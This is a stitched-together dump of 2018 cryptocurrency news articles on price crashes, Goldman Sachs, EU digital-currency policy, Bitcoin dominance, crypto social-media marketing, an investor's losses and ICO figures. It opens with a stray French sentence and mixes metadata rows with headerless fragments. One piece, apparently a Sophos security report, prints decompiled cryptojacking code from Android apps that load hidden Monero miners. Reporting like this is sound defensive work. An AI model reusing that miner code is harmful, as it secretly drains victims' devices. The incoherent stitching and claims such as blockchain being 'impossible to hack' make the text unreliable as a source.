Si le Nasdaq aimerait anticiper les mentalités de marché via les médias sociaux, les utilisateurs de médias sociaux eux essayent d’anticiper les mouvements de marché en analysant l’entrée des grosses institutions.

Crypto markets have been absolutely smashed following a Bitcoin selloff that started yesterday. From recovering to almost $240 billion in market capitalization, cryptocurrencies have crashed almost 16% in 24 hours dumping nearly $40 billion and plummeting towards another yearly low level.

The purge was initiated by Bitcoin bears which started selling it with fervor this time yesterday. Since then BTC has plunged 12% to $6,460 wiping out all gains in the past fortnight. It has returned to a previous support level of $6,400 but further losses could be forthcoming. Ethereum, which was already at a very low level, has dumped even further crashing by 18% on the day to $230. It is the lowest level ETH has been since September 15, 2017.

Altcoins have been hammered as expected with Bitcoin Cash, EOS and Monero taking the biggest falls in the top ten, all losing over 20% on the day. Litecoin and Cardano are not far behind with 18% dives and XRP and Stellar have only lost 13% at the time of writing.

Damage in the top twenty is even worse with Dash taking the largest dump at 23% to $168. Iota and Neo are also in a bad way with over 20% losses on the day and the rest are all hurting almost as bad. Tron, Ethereum Classic, Nem, VeChain and Zcash have all ditched 17-18 percent over the past 24 hours.

Only Dogecoin is under a double figure decline at the moment, losing just 5% on the day. There are no gainers in the top one hundred today as all altcoins are still in free fall. The biggest hit has been taken by Bitcoin Diamond following its unnatural pump yesterday; BCD is down 32% on the day. Also suffering heavily and losing over 25% at the moment are Bytecoin, IOST, Stratis and Bitcoin Dark.

Total crypto market capitalization has crashed over 15% in a single day marking the year’s worst daily decline. Two huge purges resulted in this massive loss which has currently settled at $203 billion. Technical indicators are all extremely bearish and markets could well slip to another 2018 low point over the next few days.

2018-09-06 14:56:51+00:00	Why Crypto’s Brutal Day May Be Good News for Crypto	['Max Gulker', 'Get Notified Of New Articles Max Gulker']	"Wall Street giant Goldman Sachs was working on plans for a cryptocurrency trading desk. While some have eyes on the possibility that crypto and blockchain technology will eventually render banks like Goldman obsolete, the desk would have given the upstart asset class new respectability in the financial world of today. Yesterday, in a press release put out by Reuters at 8:33 AM (EST), Goldman announced it was scrapping those plans for now.

At the time of this writing, about 24 hours after the announcement, Bitcoin was trading about 13 percent down from its price right before the Goldman press release of $7,388 to just about $6,400. That’s one of the largest 24-hour drops this year. Ethereum was down a whopping 22 percent, and others were not far behind.

We may hear the usual doomsday prepping and other shouting on blogs and social media, but here’s what happened: A trading desk that would have offered, in the eyes of many, legitimacy and perhaps stability to cryptocurrencies won’t be created anytime soon. And their exchange rates against the dollar fell. That isn’t a ponzi scheme, a conspiratorial black box, or animal spirits run amok. That, my friends, in all its messy and occasionally terrifying glory, is a market.

Why the Obvious Matters

We did an analysis early this year of Bitcoin’s biggest single-day price swings, and found that virtually all of those swings could be explained by a major concurrent news event. Sound obvious? It should, but take a look at our motivation for the earlier study:

If Bitcoin trades in an efficient market with enough buyers and sellers, theory holds, its price should reflect all publicly available information about it, and changes in price should reflect new information. However, Bitcoin might not yet meet this standard.

People are quick to cast cryptocurrency markets as shady black boxes full of manipulation, bubbles that have nothing to do with facts, and the ability of small numbers of investors to move markets. What we found early this year is exactly what’s happened in the last day: it’s new information that moves the prices of cryptocurrencies.

But When and by How Much?

To be sure, the reaction of Bitcoin’s price to news of this type doesn’t yet look like that of a stock in a large corporation trading on the New York Stock Exchange. Intraday data show that the lion’s share of the drop came in two bursts.

The first burst came in the early hours of September 5, a few hours before I could find any solid news of Goldman’s decision. Perhaps word did leak out — it certainly can do that on Wall Street — or perhaps something unrelated happened.

The second burst came late afternoon. It was larger and also more consistent with the possibility that traders absorbed a big piece of news or traders on the other side of the world came into the fray.

And then there’s the hallmark volatility of both Bitcoin and its fellow cryptocurrencies. As we’ve shown in other studies, the magnitude of these swings is still far higher than in more established asset classes.

This is still a volatile market in which good investing involves looking at a full picture of upsides and downsides. We don’t understand it as well as the New York Stock Exchange. But once again, recent events show that new information is the catalyst for moving crypto markets, a stepping stone on the path to greater efficiency and transparency."
2018-09-24 00:00:00+00:00	Cryptojacking apps return to Google Play Market	['Pankaj Kohli', 'About The Author']	"By Pankaj Kohli

Even though the prices of cryptocurrencies have tanked considerably in the past few months, malware authors are still upbeat about the idea of leveraging victims’ devices for mining. In conjunction with our contribution to the Cyber Threat Alliance report on cryptomining and cryptojacking, released last week, we’re publishing this report on undisclosed cryptomining code in mobile apps.

SophosLabs recently discovered 25 apps on Google Play that disguise themselves as games, utilities and educational apps, but under the hood they turn victim’s mobile device into cryptocurrency churning rigs. These apps had been downloaded and installed more than 120,000 times.

Most of the apps were found to have embedded code from Coinhive, a JavaScript implementation to mine Monero. Coinhive is specifically written to crunch numbers using CPUs (as opposed to graphics processors), which makes it a perfect candidate for covert mining on mobile devices.

The miner code, which is only a few lines long, can be easily added into any app that uses a WebView embedded browser. Monero has been the authors’ choice of cryptocurrency for all these apps as it offers sufficient privacy to keep the source, destination, and the amount mined hidden. These apps use CPU throttling to limit CPU usage by mining, and thus avoid the usual pitfalls: Device overheating, high battery drain, and overall device sluggishness – a mistake made by the mobile mining malware Loapi last year.

11 of these 25 apps were preparation apps for standardized tests given in the US, exams such as the ACT, GRE, or SAT, and were published by a single developer account (Gadgetium). These apps contain a HTML page which contains Coinhive-based miner.

function startMiner (n, id) { if (isAlreadyStarted) return ; isAlreadyStarted= true ; var miner = new CoinHive. Anonymous (id, { threads: n- 1 , autoThreads: true , throttle: 0.5 }); miner. start (); }

The apps first enable JavaScript and load the HTML page using a WebView.

this .mWebView.getSettings().setJavaScriptEnabled( true ); ... this .mWebView.loadUrl( ""file:///android_asset/test.html"" );

The miner is then started using a wallet value ( miner_id ) retrieved from the resources.

this.mWebView.loadUrl(""javascript:startMiner(\"""" + this.mNumCores + ""\"",\"""" + this.getString(string.miner_id) + ""\"")"");

While most of the Coinhive based mining apps relied on scripts hosted on coinhive.com , two of these apps – co.lighton and com.mobeleader.spsapp hosted the mining scripts on their own servers (shown below), presumably to thwart firewalls or parental controls/reputation services that might block Coinhive’s domain by default.

Log.i( this .this$1.this$0.TAG, "" STOP "" ); this .this$1.this$0.web.loadUrl( ""about:blank"" ); this .this$1.this$0.cancelNotification(); this .this$1.this$0.mFirebaseAnalytics.logEvent( ""miner_stop"" , ((Bundle)v8)); } else { Log.i( this .this$1.this$0.TAG, "" START "" ); this .this$1.this$0.web.loadUrl( ""http://www.buyguard.co/sdk/?key=1a0Cej64dYffEiItrLIeiq4GfpPtn0Hf"" ); this .this$1.this$0.setNotification(); this .this$1.this$0.mFirebaseAnalytics.logEvent( ""miner_start"" , ((Bundle)v8)); }

this .c = new WebView( this .getApplicationContext()); this .c.getSettings().setJavaScriptEnabled( true ); this .c.setWebChromeClient( new WebChromeClient()); this .c.loadUrl( ""https://miner.mobeleader.com/miner.php?hash="" + this .a.getString( ""mobeleader_appHash"" , """" ) + ""&coin="" + this .a.getString( ""mobeleader_coin"" , """" ));

One of the discovered apps – de.uwepost.apaintboxforkids was found to using XMRig, an open-source CPU miner that can mine several cryptocurrencies, including Monero.

ProcessBuilder v8 = new ProcessBuilder( new String[]{ ""./xmrig"" }); v8.directory( this .getApplicationContext().getFilesDir()); v8.environment().put( ""LD_LIBRARY_PATH"" , this .privatePath); v8.redirectErrorStream(); this .accepted = 0; this .process = v8.start(); this .outputHandler = new OutputReaderThread( this , this .process.getInputStream()); this .outputHandler.start(); Log.i( ""MiningSvc"" , ""started, threads="" + arg10.threads + "", maxCpu="" + arg10.maxCpu);

Although mining apps have been categorically banned on Google Play, many such miners still continue to be freely available on the marketplace.

SophosLabs notified Google about these mining apps in August. Although some of these apps have been taken down, many of these continue to remain available. These apps are detected by Sophos Mobile Security as Coinhive JavaScript cryptocoin miner and Android XMRig Miner.

A study by the European Parliament Committee was released on July 20 that said the crypto markets could be reshaped by a central bank digital currency in the future. The report said that a central digital currency could be the “remedy” the crypto industry is needing to make up for the lack of competition policy in the sector.

Centralized digital currency is a controversial subject in the crypto markets and industry at large. As the sector moves forward and evolves, it is only natural that calls for a centralized digital currency will be pushed, although this ethos does not sit well with crypto users who were attracted to the industry because of its decentralized nature in the first place.

EU study on crypto markets and central currencies

The study was commissioned by the European Parliament Committee on Economic and Monetary Affairs (ECON) and was released on Friday.

An interesting passage from the report on crypto markets said: “The arrival of permissioned cryptocurrencies promoted by banks, even by central banks, will reshape the current competition level in the cryptocurrency market, broadening the number of competitors.”

The study went on to talk about the role of major cryptocurrencies such as bitcoin and went on to say that “technological and operational paradigms that are a source of disruption for the entire sector, including monetary policy and financial stability.”

The study also pointed out that other “disruptive and innovative applications”, such as artificial intelligence, biometrics, the blockchain, cybersecurity, cloud computing and other innovations are augmenting reality.

Central bank issued digital currencies

The crypto markets are very dynamic and are born out of innovation and need to control our economic future. However, the report believes that private digital currencies are defined separately from central bank-issued digital currencies (CBDC). The report reckons that CBDCs are different because they are defined on conventional bilateral settlements with a trusted central party.

The report detailed that CBDCs will “reshape the current competition level in the inter- cryptocurrency markets.” And that “A potential inadequacy of traditional competition policy to address competition issues in the cryptocurrency markets can be found, suggesting direct public participation through a central-bank digital currency as a remedy.”

That’s a lot of big words to inform us that a centralized digital currency run by a major financial institution would be more trusted than a privately run cryptocurrency.

Although a move to centralize the industry might bode well for some and increase trust for investors, it could also be argued that having large cartels centralizing the crypto industry could, in fact, lessen competition.

The EU has been taking a very instrumental role in regulating the crypto industry and in mid-July kick-started a new directive to set stricter transparency rules for digital currencies. The aim is to protect itself from money laundering and those financing terrorists, although in this day and age, it is difficult to know who the real terrorists are.

It seems the quest for a centralized currency run by a few major financial institutes could well be brewing in the bowels of the EU. However, the reason crypto markets sprung up was to offer an alternative to the centralized monetary system that has been ruling for over 100 years."

Satoshi still remains an unknown figure, but the paper and the ideas it contained has taken off in a big way in the past 10 years.

The peer-to-peer electronic system proposed in that specific paper was bitcoin — a term, payment method, and investment mode that started to grow within certain sectors for almost a decade before hitting mainstream popularity in late 2017.

Bitcoin may have been the first cryptocurrency, but many alternative coins, also known as Altcoins, have used the framework provided by bitcoin to break into the cryptocurrency game.

As more altcoins appear on the market, what sets bitcoin apart and makes it the dominant cryptocurrency?

Reasons for bitcoin’s dominance

With sectors that are new and innovative, first mover advantage is key, which worked in bitcoin’s favour. In a 2009 post titled, 'Bitcoin open source implementation’ Satoshi Nakamoto highlighted the root problems with centralised conventional currency, and how strong encryption could offer a solution.

“It’s time we had the same thing for money. With e-currency based on cryptographic proof, without the need to trust a third party middleman, money can be secure and transaction effortless,” said Nakamoto — this statement still applies to the many decentralised, adaptive, and innovative altcoins that have come to be following bitcoin’s mainstream adoption.

Other aspects that speak to bitcoin’s dominance within the cryptocurrency market include its stability, confidence, and accessibility. Following bitcoin’s price surging to an all-time high of $20,000 in the fourth quarter of 2017, the crypto market has since reflected a slight correction.

However, even when markets are not doing well, , the price of bitcoin tends to be more stable than other altcoins. Despite its peaks and troughs, bitcoin is still relatively stable compared to fiat currencies which experience hyperinflation, including the Venezuelan Bolivar.

According to the International Monetary Fund (IMF), Venezuela’s hyperinflation is on its way to hitting 1,000,000% by the end of 2018.

Confidence in the bitcoin name is also a factor that lends credibility to its dominance in the crypto market.

As the first cryptocurrency, it has years of ‘experience’ under its belt, has faced adversity but continues to forge the way, and was the crypto brainchild of the paper on peer-to-peer electronic systems which is now internationally renowned.

Moreover, it is also the most immutable ledger with strong network effects, combined with an increasing hash rate which inspires confidence in the decentralised digital currency.

Bitcoin is also the most widely accepted cryptocurrency, with a slew of big retailers including Overstock.com, Expedia, PayPal, and Microsoft accepting it as payment.

This shifts the attention to accessibility to merchants and outlets that accept bitcoin, and the feasibility of using it as a method of payment. The liquidity of bitcoin can also be seen as a valuable feature of the cryptocurrency.

At present, the bitcoin dominance index, a technical measure of bitcoin’s percentage of total cryptocurrency market share by market capitalisation, now stands at just over 50%.

When looking at the cryptocurrency market, some trends are recurring. Generally speaking, when the dominance index of bitcoin is low, the market is in a downturn and when it is high, the market enters a bullish phase.

The resilient nature of bitcoin is a testament to its dominance: despite the 78% correction in the valuation of the overall cryptocurrency market this year, bitcoin remains the top coin, while its altcoin competitors are still seeking to recover fully from the market downturn.

Where does bitcoin go from here?

As applications for bitcoin exchange-traded funds (ETFs) were recently rejected by the U.S. Securities and Exchange Commission (SEC), it has put a dampener on the cryptocurrency market.

If ETFs are approved in the future, they will undoubtedly change the way traditional financiers view the crypto sector.

This swing could significantly boost the price of bitcoin as we can expect increased interest from institutional investors and traditional investors are likely to use it as an investment vehicle to diversify their portfolios.

Looking at factors that could curtail bitcoin’s dominance, research carried out by a team from City University in London suggests that bitcoin may not reign supreme in the future, and predicts that bitcoin’s market share will fluctuate at approximately 50 percent by 2025.

Strong altcoins competitors such as Ether, with recent regulation on their side, are also biting at the heels of the bitcoin giant.

Areas which bitcoin can improve on in order to maintain its standing as the dominant cryptocurrency, include improvising on fundamentals in order to make the coin more user-friendly.

Transaction speed and cost are two areas which are currently thorns in the side of bitcoin users.

These two examples are issues which need to be resolved in order to onboard more users to utilise bitcoin as a method of payment in the long run.

Calculating the direct path of bitcoin within the ever-changing cryptocurrency field is a challenge.

As specialised, more niche altcoins come on the market, it will be interesting to see how they are received by potential investors.

Amongst the crowded cryptocurrency landscape of the future, even if its dominance slips, don’t people always remember the first?

Bitcoin is the founding father and financial innovation that laid the groundwork for what is now the wider cryptocurrency landscape as we know it today, and it won’t be easily forgotten.

2018-09-26 21:13:19+00:00	Ibinex Introduces Comprehensive Market Report on Cryptocurrency	['Vishal Parmar', 'A Realist', 'Self-Driven', 'Persistent Entrepreneur', 'Vishal Parmar Is The Ceo Of Vap Group', 'The Founder Of Cryptonewsz. At The Helm Of Operations At One Of The Fastest-Growing Blockchain', 'Crypto Websites In The World', 'Vishal Found His First Technology Firm At The Age Of Born With Strong Business Acumen', 'He Entered The Blockchain', 'Crypto Space In']	"New York-based Ibinex, a White Label Solution, has recently released its comprehensive market research report on the cryptocurrency industry. The report systematically details vital statistics, developments, innovations, and other findings on the ongoing status of the international cryptocurrency market.

Entitled as ‘The Global Cryptocurrency Market Report,’ it critically examines the four major sectors of cryptocurrency– exchanges, mining, wallets, and payments, along with other significant facets such as ICOs, the blockchain, and regulations.

Additionally, the document discusses the composition of cryptocurrency by providing a breakdown of characteristics unique to cryptocurrency— cryptographic nature, irreversible transactions, no authorization to join (unless a country has regulations against cryptocurrency), pseudonymous character, and limited supply.

The report is a global observation on the analytical findings of the trending crypto aspects like crypto trading volumes, usage, cryptocurrency regulation, global knowledge, all of which are classified as per regions (Asia, Europe, Middle East, South, and Latin America, Africa) or countries (U.S., Canada).

Dalia Research’s statistical survey on the global knowledge of cryptocurrency in some of the world’s largest economies, finds special mention in the market research. An extensive graph illustrates people’s differing levels of crypto knowledge, their intent to buy it, and the variances in crypto ownership levels as of March 20, 2018.

The report is replete with graphs and charts to substantiate its finds.

For instance, to highlight on the worldwide legality of cryptocurrency, the report includes the country-wise graphic listing prepared at the G20 2018 Summit Meeting. The graph shows the legal status of crypto in a variety of countries in four categories: neutral, legal, illegal, and restricted. Interestingly, China remains the only country in which cryptocurrency has an illegal status.

On similar lines, is a graphical illustration which explores the worldwide demographics of cryptocurrency usage, specifically Bitcoin, primarily throughout the first 90 days of Q2 2018. The statistics present Bitcoin ownership predominantly as follows:

European: 33.9%

Male: 86.9%

Ages 25-34: 38.2%

Ibinex’s market research then delves into the ‘risky’ ICO (Initial Coin Offering) industry and investigates the ever-changing ICO market, ICO regulations, ICO funds raised on a global scale, etc. It also lays out an interesting timeline of the most successful ICOs and their ensuing tokens in each year following the first ICO:

Ethereum (2014), NEO (2015), Stratis (2016), EOS (2017), Dragon (2018), et al.

The regulatory environment of cryptocurrency is still undergoing development. Ibinex’s research effectively probes into the pro-crypto jurisdictions throughout the world. It presents a list of the ten most crypto-friendly jurisdictions in the world, i.e., Switzerland, Japan, United Kingdom, Australia, The Netherlands, Denmark, Slovenia, Hong Kong, Estonia, and Singapore.

Ibinex’s ground-breaking global cryptocurrency market report can definitely be considered as the perfect guide for all aspiring crypto enthusiasts!

Digital currency market commentary

We’re more than half way through September and the majority of the top cryptocurrencies continue to show falls for the month as they did in August. This week has seen most currencies gaining values. Therefore the monthly decline compared to the last analysis (12th September) is reduced. For Ripple in particular this week’s gains have been large. It is still down 1.55% for the month but at the last analysis is was down 22.30% so over the last seven days it has made a strong recovery.

2018-09-04 20:54:12+00:00	How social media drives cryptocurrency for users & brands	['Kayla Lee']	"There’s loads of hype around cryptocurrency these days. Back in 2016, the only friends I had that talked about it were developers. And suddenly, it seems like almost overnight, everyone is talking about Bitcoin and crypto. The link between cryptocurrency and social media has had much to do with the rise in popularity, and probably price, of cryptocurrencies.

In this post, we’re going to cover why social media has played such a huge role in the success of crypto – and which particular aspects of social media are responsible for a lot of this newfound popularity.

What is cryptocurrency?

Cryptocurrency is an encrypted, digital, and decentralized currency that uses blockchain technology. What that means in layman’s terms is:

It’s impossible to hack because blockchain technology is incredibly secure. Learn more about it in this video.

It’s decentralized and individual units of currency are controlled by the people that own it.

You can imagine the benefits of this type of money – something that isn’t controlled by banks or inflation. It’s controlled by the peers that own it.

The rise of cryptocurrency

So how did this crypto thing come to be? Bitcoin (the first, and probably most important cryptocurrency) was invented by a person or group that goes by the alias Satoshi Nakamoto. Throughout the 1990s, there had been past attempts at creating a digital cash system, but none took off. In 2008, Nakamoto published a paper outlining how Bitcoin could work as a decentralized digital currency. This included concepts that are still hot topics in crypto today, including the idea of a supply determined by digitally ‘mining’ new coins, and the secure blockchain.

It all started on forums and email lists

To promote Bitcoin at its start, Nakamoto built an email list of 2,000 subscribers and became active on forums like Bitcoin Talk. The first ever bitcoin transaction happened in 2010 via Bitcoin Talk, when one user bought 2 pizzas for 10,000 bitcoins.

Those bitcoins are worth 67 million dollars as I’m writing this article. At the recent peak of Bitcoin’s value, they were worth around 200 million dollars.

How cryptocurrencies are using social channels

Educating buyers

One of the biggest hurdles cryptocurrencies and other blockchain technologies face is educating potential customers. Blockchain and cryptocurrency aren’t the easiest concepts to grasp, and so, video (like the blockchain explanation video we shared with you before) has played a major role in how these companies market themselves on social media.

Take Ripple, a blockchain for global payments, for example. With nearly a million followers on Twitter, they’re constantly sharing educational webinars with their audiences and even launched their own TV show.

Creating communities

Saying that some people are really passionate about cryptocurrency would be a massive understatement. So, lots of these up-and-coming currencies are creating chatrooms, Slack channels, subreddits, forums, etc. to keep their markets informed and connected.

They regularly post about these open communities on their social channels and encourage people to join. Check out this post by Wanchain (a digital currency market) about joining their Discord channel:

https://twitter.com/wanchain_org/status/1028023721397813249

You can tell their followers are excited about joining as the post got over 40 shares and nearly 200 likes.

Medium

Medium.com is a growing blogging platform built by Evan Williams, the founder of Twitter. It’s got two unique advantages:

You can tag articles so that they show up for people interested in the topic you’re writing about—this is great for getting your name out there and building a following because the people are already on the platform.

The $5 subscription fee is paid to the writers on the platform, based on the popularity of their articles (how many, “claps,” each article gets).

Cryptocurrency is a hugely popular tag on Medium. Articles written in this space perform really well with Medium’s communities. This recent one got over 80k claps (Medium’s version of a “like”).

So, crypto and blockchain companies are taking advantage of Medium to build hype around the blockchain industry. For example, ICON (a blockchain/crypto network) recently shared an article they’d published on Medium with their Facebook audience.

Cross promoting Medium articles on social channels does two things for cryptocurrency companies:

They build engagement in their social channels by sharing relevant, informative content that their users are highly interested in. They drive more traffic back to the Medium article, in turn increasing the rate at which Medium shows it in the feeds of people following the tags the article uses, such as “cryptocurrency” or “blockchain.”

How exchanges use social media

Cryptocurrencies themselves aren’t the only forces behind the rise in crypto’s popularity on social channels. Exchanges—trading markets for cryptocurrencies—are actively engaging their audiences with news and updates on blockchain currency as well.

Let’s take a look at how some cryptocurrency exchanges are driving engagement on social media.

Customer support & alerting

Whether exchanges have a dedicated support account or not on social channels, they do use social media to point customers to the right places at the right time. Take this example from Bittrex, a blockchain platform for real-time trading, alerting users via Twitter about a potential scam and pointing them to their support site:

Tip: Don’t take the bait from impersonation accounts. Always make sure to communicate with the official @bittrexExchange handle with the blue verified checkmark. Learn more: https://t.co/lQFWvccu1p pic.twitter.com/xA1DIgsi6O — Bittrex (@BittrexExchange) August 27, 2018

And another example, when Bithumb (a Korean crypto exchange) took to Twitter to alert users of their response to a security issue:

In all of these cases, brands build trust by staying on top of audiences’ security concerns. This is particularly important considering that crypto is a very new area of interest for many users, and finding reliable sources and services can be daunting.

For exchanges that have to frequently deal with complex support topics, it’s always a good idea to have guidelines and standards around what to communicate to your followers. You can use Sprout Social’s saved replies to store full responses or small snippets that can be dropped into a more detailed or customized response. This ensures accuracy when your customer care team is working quickly to reassure customers on a variety of subjects.

Industry news and updates

The crypto community loves to stay in-the-know about current happenings and trends. Particularly since the incredible surge in Bitcoin and other cryptocurrency values, users have been eager for the slightest update.

This has played out really well for crypto/blockchain brands on social media. They can use this hype to their advantage, and create a ton of engagement from one update.

Take this example from Bithumb, where they’re updating followers on their own internal news:

[Re-Notice] The resuming of the deposit/withdrawal services for 9 types of crytocurrencies first • List of cryptocurrencies (9 in total)

: BTC, ETH, ETC, XRP, LTC, BCH, ZEC, QTUM, MITH •Open time : 4, Aug (Sat) 2018 19:00 PM ▶https://t.co/iAJP9YkE0m — Bithumb (@BithumbOfficial) August 4, 2018

As you can see, this post got a lot of engagement simply around internal news for one platform. You can imagine how much further engagement posts on news & updates that affect the larger cryptocurrency space could receive.

Hiring and employee appreciation

Not everything is about the end-user when it comes to any exchange’s presence on social media. Lots of companies, particularly in the tech space, use social media to find great employees.

A benefit of this is that when you’re sharing your jobs via social, you’re not only increasing engagement and increasing awareness of the job you’ve got available, but you’re also exposing your job to a select amount of users who are likely more passionate about your job vs. someone who stumbled across it on a job site like Monster.

Discounts and offers

Another big trend for engagement that exchanges follow on social media is that of offering a discount. It goes a long way too, check out this offer from Bithumb:

✨UP TO 70% PAY BACK EVENT✨

Bithumb offers big benefit for global new members! ▶PC : https://t.co/brkK8iGi0G

▶MO : https://t.co/liIWmBB6Bx pic.twitter.com/XMO1Q45P2F — Bithumb (@BithumbOfficial) August 16, 2018

You can read more about using discounts and other creative strategies to the advantage of your own company on our blog. Benefits and discounts can help differentiate brands and draw users to one exchange over another in the crowded crypto space.

How news and rumors on social media influences cryptocurrency

In basic economics, one learns that high demand increases price. In this way, the price of cryptocurrencies is affected each time there’s hype in the media. Prices can rise with positive hype and plummet with negative attention.

Similarly, when currencies release update news, like when the Citcoin network announced the lightning app, prices can rise as news of this feature spreads.

So, because nearly 70% of US adults get their news from social media, you can imagine how integral social media is in determining the demand/price of Bitcoin and other currencies.

In fact, the big Bitcoin bubble earlier this year wouldn’t have been possible without media coverage and social sharing, because most people had no idea what cryptocurrency was before reading about it in an online publication or seeing it in their newsfeeds.

In conclusion

Starting in 2009, very few people were aware that decentralized currency was possible, nevertheless existed. From an email list with an audience of 2,000, awareness of cryptocurrency has turned into one of the most popular topics online today.

Cryptocurrency value has been dramatically shaped by the influence of social media. Popular publications, industry influencers, and the currencies themselves play a major role in the online hype.

2018-09-11 00:00:00+00:00	Bitcoin crash: This man lost his savings when cryptocurrencies plunged	['Michael Kaplan']	"An estimated $400 billion has been wiped off the value of major cryptocurrencies since January.

Sean Russell's life savings were among them.

Russell rarely played the stock market and had little investing experience when he put around $120,000 into bitcoin in November 2017. He was stunned when that turned into $500,000 in just one month.

""I think there was one morning where I woke up, where I made about £12,000 ($15,600) in one morning on my investment and it just kept going,"" said Russell. ""I was thinking, wow, that's mortgages paid, that's holidays that I've always dreamed of.""

The dream didn't last for Russell, who works as a property developer in the United Kingdom, buying homes and fixing them up. The price of Bitcoin surpassed $20,000 in December before collapsing. It now trades at $6,300.

Russell attempted to mitigate his losses by shifting money from bitcoin (XBT) to an offshoot called Bitcoin Cash and other cryptocurrencies including Ethereum and Ripple. But that didn't work, and Russell says the paper losses on his initial investment have reached 96%.

""It was devastating, quite traumatic, really,"" Russell said. ""I've seen stories on the news of billionaires going bankrupt, and you think how can that be? How on earth did you lose that amount of money? And yet, here I am in that position.""

Russell is not alone.

Michel Rauchs, who researches cryptocurrency and blockchain at the Cambridge Centre for Alternative Finance, said the explosive rise in prices in 2017 attracted a wave of inexperienced investors.

""Retail investors, students, housewives, even grandma was driven in by the hype,"" says Rauchs. ""They were told by the media that this was an opportunity of a lifetime. They bought at the top and are now sitting on heavy losses.""

The crash has left professional investors and enthusiasts debating where cryptocurrencies go from here.

""Clearly the frenzy that we have seen and the volatility in the price of bitcoin ... resembles a lot of other financial bubbles that happen over and over again in our economic history,"" said Benedetto De Martino, a behavioral economist at University College London.

The fever that gripped cryptocurrency investors has faded in recent months. JPMorgan (JPM) CEO Jamie Dimon and Warren Buffett of Berkshire Hathaway (BRKA) have warned investors to stay away from bitcoin.

Last week, bitcoin prices plunged more than 20% in two days after Business Insider reported that investment banking giant Goldman Sachs (GS) may be dropping plans to launch a crypto trading desk.

Goldman Sachs told CNNMoney it hadn't made a firm decision bitcoin or other cryptocurrencies.

The Securities and Exchange Commission blocked several proposals for bitcoin exchange-traded funds in the past few months, including plans from ETF giants ProShares and Direxion and one backed by the Winklevoss brothers.

Despite the warnings, some cryptocurrency entrepreneurs see the boom and bust as growing pains.

""Markets are cyclical and there's still a lot of opportunity for sophisticated investors,"" said Benjamin Dives, CEO of cryptocurrency trading platform London Block Exchange.

Before he first invested, Russell spent years tracking bitcoin and studying blockchain, the technology underpinning digital currencies. He said the learning process was like solving the plot of a murder mystery.

Despite the loss, he remains a committed investor.

""I have to be hopeful about something,"" he said. ""I need to keep my mind occupied, because when I just focused on the money I lost, it destroyed me mentally and emotionally.""

The market’s continued boom has been boosted by regulation in some key markets, which has helped the fundraising method mature and become more accepted as a mode of business, though fears of criminality in the sector still persist.

An initial coin offering (ICO) is a means of crowdfunding centred on cryptocurrency, which can be a source of capital for start-up companies. In an ICO, some quantity of the crowdfunded cryptocurrency is pre-allocated to investors in the form of ""tokens,"" in exchange for other cryptocurrencies such as Bitcoin or Ethereum, or increasingly for fiat currencies (currency that a government has declared to be legal tender, but it is not backed by a physical commodity). These tokens become functional units of currency if or when the ICO's funding goal is met and the project launches.

The first ICO took place in 2013, with a total of two taking place that year. By 2014, this had risen to eight ICOs with a combined total value of $30 million. The total value of Initial Coin Offerings breached the barrier of $4 billion globally last year, with further growth projected for the coming period. Now in 2018, ICOs have gained further momentum and are emerging as a workable, alternative form of crowdfunding. Strategically, ICOs continue to crowd out traditional VC funding, especially in technology and Blockchain-related start-ups.

Hybrid models (combining classic VC/PE funding and ICO) are increasingly establishing themselves as a valid funding alternative. The continued rise of the ICO in 2018 has even seen the funding technique yield its firs unicorns (start-ups worth over $1 billion). Telegram and EOS boast an estimated record breaking $1.7 billion and $4.1 billion, respectively.



While the notoriously volatile value of the likes of Bitcoin has broadly risen, however, a number of factors could see the cryptocurrency bubble burst in the near future. ICOs are inconsistently regulated across the world, and, depending on the jurisdiction, they can take different forms including a security, utility token or digital currency. Prospectively, ICOs are increasingly an alternative to classic debt/capital-funding as performed today by Venture Capital/ Private Equity firms and banks.

ICO unicorns

Overall, in the first 5 months of 2018, a total of 537 ICO’s with an estimated value of $13.7 billion have been closed successfully – which is more than all pre-2018 ICOs combined. According to data gathered by PwC’s strategy consulting wing, Strategy&, in cooperation with Crypto Valley, the US, Singapore and the UK remain the world leaders on the ICO front, in terms of volume. The trio have closed 157 successful ICOs between them already in 2018, with a further 153 planned before the end of the year.

The USA can chalk its success as a leading ICO destination up to its market being reinforced by clear and firm regulatory requirements, for example with the new Know Your Customer commitments, which ensure businesses verify the identity of clients and assess potential risks of illegal intentions for the business relationship. The UK has seen a growth in terms of volume and value, with its estimated funds raised standing at $507 million, Singapore yielded the highest value from ICOs of the three leaders. Singapore’s 53 ICOs brought in $1.1 billion in total. However, in terms of value, these campaigns have yielded proportionally far smaller amounts of capital than those based in the Cayman Islands, and the British Virgin Islands.

Thanks to these nations’ reputations as keystone tax havens, it is perhaps unsurprising that investors keen to see large returns would locate their funds in ICO projects which will ultimately be taxed minimally. The ten ICOs of the Cayman Islands scored a total of $4.2 billion, and the location has a further 16 such funding efforts planned before 2018 is out. At the same time, the 16 ICOs of the British Virgin Islands brought in a total of $2.2 billion, but there are only two further fundraising projects planned for that territory before the turn of the year. While the two island states might seem to command a disproportional amount of ICO funds, however, it is important to note that the aforementioned ICO unicorns were based in those locations.

Largest Initial coin offerings

As mentioned, the two unicorns EOS and Telegram dwarf the amounts brought in by the other top ICO campaigns to date. Their nearest equivalent, also hosted in the Virgin Islands, was Dragon. The Dragon Coin is said to act as a frictionless, low-cost & transparent alternative financial mechanism within Casinos, and raised $320 million.

Beyond these three, the top ICOs were dominated by those based beyond the Cayman and British Virgin Islands. Singapore hosted the fourth largest, Huobi Token, which delivered $300 million of investment. Elsewhere, Switzerland hosted six entries in the top 15 campaigns. HDAC (#5) raised $258 million, Tezos (#7) brought in $232 million, Sirin Labs (#8) saw $158 million, Bancor (#9) yielded $153 million, Polkadot (#11) enjoyed a $145 million investment, and The DAO received $143 million from backers.

The US also hosted multiple ICOs at the top of the list, with Filecoin (#6) bringing in $257 million, and Basis (#14) gaining an investment of $133 million. Lituania (#10, Bankera, $151 million), Barbados (#13, Polymath, $139 million) and Israel (#15, Orbs, $118 million) each played home to a single top ICO meanwhile.

While the ICO market seems set to continue its growth in the coming years, however, there is still some scepticism about the technique. Investors are often deterred by the fact that only around a third of all announced ICO projects actually close successfully, while many projects are delayed and lose momentum during ICO preparation processes. Reasons can reach from legal struggles to problems within the ICO project team. At the same time, the market is still dogged by a reputation for a propensity to hosting fraudsters.

